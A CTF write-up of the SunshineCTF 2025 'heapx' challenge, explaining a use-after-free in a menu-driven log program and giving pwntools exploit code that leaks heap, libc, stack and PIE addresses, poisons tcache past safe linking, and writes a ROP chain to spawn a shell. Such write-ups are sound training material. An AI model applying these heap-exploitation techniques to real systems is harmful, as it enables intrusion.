---
title: SunshineCTF - heapx Challenge Writeup
summary: A detailed writeup for the heapx challenge from SunshineCTF 2025, focusing on heap exploitation techniques.
description: This writeup explains how to solve the heapx challenge by leveraging a UAF bug.
tags: [ctf, writeup, pwn, heap]
categories: [heap, Use After Free]
date: 2025-09-29
draft: false
---

# SunshineCTF - `heapx` Challenge Writeup

## 0x00 Overview

### Challenge Description

> HeapX<br>
> Oreomeister<br>
> We discovered the Falcon 9 rocket's log aggregator, HeapX, can you pwn it and take control before it reaches orbit?<br>

### Checksec

```bash
$ checksec heapx
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

I used `pwninit` to patch the binary, setting `RUNPATH` to the current directory. This ensures the provided `libc.so.6` is loaded instead of the system's default library.

# 0x01 Analysis

Opening given binary in IDA, we can see that it is a menu-driven program with the following options:

1. Allocate

```
__int64 __fastcall create(int index, int size)
{
  void *ptr; // [rsp+10h] [rbp-10h]

  if ( size > 0 && size <= 1279 )
  {
    ptr = malloc(size);
    if ( ptr )
    {
      puts("[INFO] Creating new log...");
      *(&ptr_table + 2 * index) = ptr;
      size_table[4 * index] = size;
      return 1LL;
    }
    else
    {
      return 0LL;
    }
  }
  else
  {
    puts("[ERROR] Invalid size!!");
    return 0LL;
  }
}
```

2. Read

```
unsigned __int64 __fastcall read_data(int index)
{
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( index < 0x10 )
  {
    if ( *(&ptr_table + 2 * index) )
      printf("%s", *(&ptr_table + 2 * index));
    else
      printf("[ERROR] Log #%d doesn't exist!!\n", index);
  }
  else
  {
    puts("[ERROR] Invalid log number!!");
  }
  return v2 - __readfsqword(0x28u);
}
```

3. Write

```
unsigned __int64 __fastcall write(unsigned int index, int offset)
{
  int v3; // [rsp+1Ch] [rbp-514h]
  _BYTE buf[1288]; // [rsp+20h] [rbp-510h] BYREF
  unsigned __int64 v5; // [rsp+528h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(buf, 0, 0x500uLL);
  if ( index < 0x10 )
  {
    if ( *(&ptr_table + 2 * index) )
    {
      if ( offset >= 0 && offset < size_table[4 * index] )
      {
        printf("Enter log data: ");
        v3 = read(0, buf, size_table[4 * index] - 1 - offset);
        memcpy((offset + *(&ptr_table + 2 * index)), buf, v3 - 1);
      }
      else
      {
        puts("[ERROR] Write offset is invalid!!");
      }
    }
    else
    {
      printf("[ERROR] Log #%p doesn't exist!!\n", &ptr_table + 16 * index);
    }
  }
  else
  {
    puts("[ERROR] Invalid log number!!");
  }
  return v5 - __readfsqword(0x28u);
}
```

4. Delete

```
unsigned __int64 __fastcall delete(int index)
{
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( index < 0x10 )
  {
    if ( *(&ptr_table + 2 * index) )
      free(*(&ptr_table + 2 * index));
    else
      printf("[ERROR Log #%d doesn't exist!!\n", index);
  }
  else
  {
    puts("[ERROR] Invalid log number!!");
  }
  return v2 - __readfsqword(0x28u);
}
```

5. Exit
   <br>
   <br>
   At the end of the program, there is a loop that frees all allocated chunks:

```
puts("\n[INFO] Shutting down HeapX LogUplink...");
  for ( i = 0; i <= 15; ++i )
  {
    if ( *(&ptr_table + 2 * i) )
      free(*(&ptr_table + 2 * i));
  }
  return 0LL;
```

# 0x02 Vulnerability Analysis

The vulnerability in this binary is a Use-After-Free (UAF) bug. The `delete` function frees the allocated chunk but does not set the corresponding pointer in `ptr_table` to `NULL`. This allows an attacker to still access the freed memory through the `read` and `write` functions, leading to potential exploitation.

# 0x03 Exploitation

## Roadmap

1. Leak a heap address to calculate the base address of the heap.
2. Leak a libc address to calculate the base address of libc.
3. Leak a stack address to calculate the return address location.
4. Leak pie base address to calculate the location of `ptr_table`.
5. Overwrite `ptr_table` and `size_table` to `NULL` to escape the loop at the end of the program.
6. Overwrite the return address with ROP chain to get a shell.

## Step 1: Leak heap address

```python
chunk_A = malloc(0x80)
chunk_B = malloc(0x80)
chunk_C = malloc(0x420)
chunk_D = malloc(0x80)

delete(chunk_A)
delete(chunk_B)
delete(chunk_C)

read(chunk_B)
leak = p.recvn(6)
leak = u64(leak.ljust(8,b'\x00'))
log.critical(f"leak: {hex(leak)}")

read(chunk_A)
p.recvn(0x1)
leak2 = p.recvn(6)
key = u64(leak2[1:].ljust(8,b'\x00'))
log.critical(f"key: {hex(key)}")


addr = leak^ key
log.info(f"addr: {hex(addr)}")

heap_base = addr - 0x12b0
log.critical(f"heap base: {hex(heap_base)}")
```

Since Safe Linking is enabled, we need to XOR the leaked address with a key derived from the heap address. The key can be obtained by reading the first byte of another chunk.

You can refer [here](https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking) for more information about Safe Linking.

## Step 2: Leak libc address

```python
heap_base = addr - 0x12b0
log.critical(f"heap base: {hex(heap_base)}")

read(chunk_C)
leak3 = p.recvn(8)
leak3 = u64(leak3[2:].ljust(8,b'\x00'))
log.info(f"leak3: {hex(leak3)}")

libc.address = leak3 - 0x210b20
log.critical(f"libc base: {hex(libc.address)}")
```

By freeing `chunk_C` it goes into the unsorted bin. The fd and bk pointers of the chunk point to `main_arena`. We can leak one of these pointers to calculate the base address of libc.<br>

## Step 3: Leak stack address

In `libc`, there is a global variable `environ` which acts as a dictionary where environment variables are stored as key-value pairs. The address of `environ` can be used to leak a stack address.

```python
environ = libc.symbols['environ']
log.critical(f"environ: {hex(environ)}")

delete(chunk_D)
payload = p64((environ-24) ^ ((heap_base + 0x1000) >> 12))
write(chunk_D,b'0',payload)

chunk_F = malloc(0x80)
chunk_G = malloc(0x80) # <--- our environ chunk
payload = b'D3L3T357'*3
write(chunk_G,b'0',payload)
read(chunk_G)
p.recvn(0x19)
leak_stack = p.recvn(8)[2:]
leak_stack = u64(leak_stack.ljust(8,b'\x00'))
log.success(f"leak stack: {hex(leak_stack)}")

rip_addr = leak_stack - 0x130
log.critical(f"rip addr: {hex(rip_addr)}")
```

We can use the UAF bug to overwrite a chunk's fd pointer to point to `environ`. When we allocate a new chunk of the same size, it will return a pointer to `environ`. We can then read from this chunk to leak a stack address.<br>
To calculate the correct value to write to the fd pointer, we need to XOR the address of `environ` with the heap key. The heap key is derived from the heap base address. The formula is `environ ^ (heap_base >> 12)`.

## Step 4: Leak pie base address

We can see that `write` function outputs the address of elf from `ptr_table` when we try to read from an unallocated index.

```c
{
   printf("[ERROR] Log #%p doesn't exist!!\n", &ptr_table + 16 * index);
}
```

```python
# =+=+--+=+= ELF LEAK +=+=+--+=+=
p.sendline(b'write 15')
p.sendline(b'0')
p.recvuntil(b'0x')
leak_elf = p.recv(12)
leak_elf = int(leak_elf,16)
log.success(f"leak elf: {hex(leak_elf)}")
elf.address = leak_elf - 0x4150
log.critical(f"elf base: {hex(elf.address)}")
```

By leaking the address of elf from `ptr_table`, we can calculate the base address of the pie.

## Step 5: Overwrite `ptr_table` and `size_table` to `NULL`

```python
# =+=+--+=+= CLEARING PTR_TABLE AND SIZE_TABLE +=+=+--+=+=
chunk_L = malloc(0x200)
chunk_M = malloc(0x200)
chunk_N = malloc(0x100) # guard chunk

delete(chunk_L)
delete(chunk_M)

ptr_table = elf.address + 0x4060
payload = p64((ptr_table) ^ ((heap_base + 0x1000) >> 12))

write(chunk_M,b'0',payload)
chunk_N = malloc(0x200)
chunk_O = malloc(0x200) # <--- our ptr_table chunk
payload = p64(0)*32
write(chunk_O,b'0',payload)
```

We can use the UAF bug to overwrite a chunk's fd pointer to point to `ptr_table`. When we allocate a new chunk of the same size, it will return a pointer to `ptr_table`. We can then write `NULL` values to clear the table and escape the loop at the end of the program.<br>
We are allocating a guard chunk to prevent consolidation with the top chunk when we free `chunk_L` and `chunk_M`.
`0x200` is choosen because we need to fill 8\*32 bytes with null to clear them all.

## Step 6: Overwrite return address with ROP chain

```python
# =+=+--+=+= ROP CHAIN ON STACK +=+=+--+=+=

chunk_H = malloc(0x30)
chunk_I = malloc(0x30)

delete(chunk_H)
delete(chunk_I)

payload = p64((rbp_addr) ^ ((heap_base + 0x1000) >> 12))
write(chunk_I,b'0',payload)
chunk_J = malloc(0x30)
chunk_K = malloc(0x30) # <--- our stack chunk

bin_sh = libc.address+0x1d84ab
pop_rdi = libc.address+0x119e9c
system = libc.address+0x5c110
pop_rdi_pop_rbp = libc.address+0x2aa6b
ret = libc.address+0x0000000000028882

payload = p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
write(chunk_K,b'0',payload)
```

# 0x04 Conclusion

By leveraging the UAF bug, we were able to leak heap, libc, stack, and pie addresses. We then used these leaks to overwrite `ptr_table` and `size_table` to `NULL`, allowing us to escape the loop at the end of the program. Finally, we overwrote the return address with a ROP chain to get a shell.
